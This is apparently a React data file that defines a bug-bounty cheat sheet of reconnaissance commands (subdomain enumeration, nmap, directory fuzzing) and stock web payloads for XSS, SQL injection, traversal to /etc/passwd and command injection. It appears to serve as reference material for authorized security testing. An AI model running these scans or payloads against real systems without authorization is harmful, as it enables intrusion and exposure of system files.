import { HiCode, HiOutlineShieldCheck, HiOutlineDocumentText } from 'react-icons/hi';

export const cheatSheetData = [
  {
    title: 'Reconnaissance Commands',
    icon: <HiCode />,
    content: [
      {
        subtitle: 'Subdomain Enumeration',
        code: `sublist3r -d target.com
assetfinder target.com
amass enum -d target.com`,
      },
      {
        subtitle: 'Port Scanning',
        code: `nmap -sS -sV -sC target.com
nmap -p- target.com`,
      },
      {
        subtitle: 'Directory Discovery',
        code: `gobuster dir -u http://target.com -w /path/to/wordlist
ffuf -w wordlist.txt -u http://target.com/FUZZ`,
      },
    ],
  },
  {
    title: 'XSS Payloads',
    icon: <HiCode />,
    content: [
      {
        subtitle: 'Basic Payloads',
        code: `<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>`,
      },
      {
        subtitle: 'Advanced Payloads',
        code: `<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<details open ontoggle=alert('XSS')>`,
      },
    ],
  },
  {
    title: 'SQL Injection Payloads',
    icon: <HiCode />,
    content: [
      {
        subtitle: 'Basic Payloads',
        code: `' OR '1'='1
' OR 1=1--
' UNION SELECT 1,2,3--`,
      },
      {
        subtitle: 'Time-Based Payloads',
        code: `'; WAITFOR DELAY '00:00:05'--
' OR 1=1; SELECT SLEEP(5)--`,
      },
    ],
  },
  {
    title: 'Directory Traversal',
    icon: <HiCode />,
    content: [
      {
        subtitle: 'Basic Payloads',
        code: `../../etc/passwd
.././.././etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
      },
    ],
  },
  {
    title: 'Command Injection',
    icon: <HiCode />,
    content: [
      {
        subtitle: 'Basic Payloads',
        code: `; ls -la
&& ls -la
| ls -la`,
      },
    ],
  },
  {
    title: 'Bug Bounty Methodology',
    icon: <HiOutlineShieldCheck />,
    content: [
      {
        subtitle: 'Phases',
        code: `1. Reconnaissance
2. Analysis
3. Testing
4. Documentation
5. Reporting`,
      },
    ],
  },
  {
    title: 'Pro Tips',
    icon: <HiOutlineDocumentText />,
    content: [
      {
        subtitle: 'General Advice',
        code: `Always customize your wordlists and payloads based on the target's technology stack.
Generic payloads are often filtered.
Combine reconnaissance findings to discover unique attack vectors.`,
      },
    ],
  },
];

